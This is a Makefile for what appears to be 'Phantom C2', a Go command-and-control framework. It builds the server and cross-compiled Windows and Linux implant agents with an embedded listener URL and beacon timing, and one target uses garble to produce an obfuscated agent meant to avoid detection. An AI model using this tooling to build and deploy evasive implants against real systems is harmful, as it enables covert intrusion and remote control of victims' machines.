MODULE      := github.com/phantom-c2/phantom
SERVER_BIN  := phantom-server
AGENT_BIN   := phantom-agent
BUILD_DIR   := build
AGENT_DIR   := $(BUILD_DIR)/agents
VERSION     := $(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
LDFLAGS     := -s -w -X '$(MODULE)/internal/implant.Version=$(VERSION)'

LISTENER_URL ?= https://127.0.0.1:443
SLEEP        ?= 10
JITTER       ?= 20

# ──────────────── Server ────────────────

.PHONY: server
server: ## Build the server binary
	@echo "[*] Building Phantom server..."
	@mkdir -p $(BUILD_DIR)
	go build -ldflags "$(LDFLAGS)" -o $(BUILD_DIR)/$(SERVER_BIN) ./cmd/server
	@echo "[+] Server built: $(BUILD_DIR)/$(SERVER_BIN)"

# ──────────────── Agents ────────────────

.PHONY: agent-windows
agent-windows: ## Cross-compile Windows/amd64 agent
	@echo "[*] Building Windows/amd64 agent..."
	@mkdir -p $(AGENT_DIR)
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	go build -ldflags "$(LDFLAGS) \
	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)'" \
	  -o $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.exe ./cmd/agent
	@echo "[+] Agent built: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.exe"

.PHONY: agent-linux
agent-linux: ## Cross-compile Linux/amd64 agent
	@echo "[*] Building Linux/amd64 agent..."
	@mkdir -p $(AGENT_DIR)
	GOOS=linux GOARCH=amd64 CGO_ENABLED=0 \
	go build -ldflags "$(LDFLAGS) \
	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)'" \
	  -o $(AGENT_DIR)/$(AGENT_BIN)_linux_amd64 ./cmd/agent
	@echo "[+] Agent built: $(AGENT_DIR)/$(AGENT_BIN)_linux_amd64"

.PHONY: agent-garble-windows
agent-garble-windows: ## Obfuscated Windows agent via garble
	@echo "[*] Building obfuscated Windows/amd64 agent..."
	@mkdir -p $(AGENT_DIR)
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	garble -literals -tiny -seed=random build \
	  -ldflags "$(LDFLAGS) \
	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)'" \
	  -o $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64_garbled.exe ./cmd/agent
	@echo "[+] Obfuscated agent built: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64_garbled.exe"

.PHONY: agent-all
agent-all: agent-windows agent-linux ## Build all agent variants

# ──────────────── Utilities ─────────────

.PHONY: keygen
keygen: ## Generate RSA keypair for server
	@echo "[*] Generating RSA keypair..."
	go run ./cmd/keygen -out configs/
	@echo "[+] Keys saved to configs/"

.PHONY: certs
certs: ## Generate self-signed TLS certificates
	@echo "[*] Generating TLS certificates..."
	bash scripts/generate_certs.sh
	@echo "[+] Certificates generated"

# ──────────────── Development ───────────

.PHONY: deps
deps: ## Install dependencies
	go mod tidy
	@echo "[*] Installing garble..."
	go install mvdan.cc/garble@latest 2>/dev/null || echo "[-] garble install failed (optional)"
	@echo "[+] Dependencies ready"

.PHONY: lint
lint: ## Run golangci-lint
	golangci-lint run ./...

.PHONY: test
test: ## Run all tests
	go test -race -count=1 ./internal/...

.PHONY: test-crypto
test-crypto: ## Run crypto package tests
	go test -v -race ./internal/crypto/...

.PHONY: test-protocol
test-protocol: ## Run protocol tests
	go test -v -race ./internal/protocol/...

.PHONY: run
run: server ## Build and run the server
	./$(BUILD_DIR)/$(SERVER_BIN) --config configs/server.yaml

# ──────────────── Cleanup ───────────────

.PHONY: clean
clean: ## Remove all build artifacts
	rm -rf $(BUILD_DIR)
	rm -f data/*.db
	@echo "[+] Cleaned"

.PHONY: help
help: ## Show this help
	@echo ""
	@echo "  Phantom C2 - Build Targets"
	@echo "  ─────────────────────────────────────────"
	@grep -E '^[a-zA-Z_-]+:.*##' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*## "}; {printf "  \033[36m%-25s\033[0m %s\n", $$1, $$2}'
	@echo ""

.DEFAULT_GOAL := help
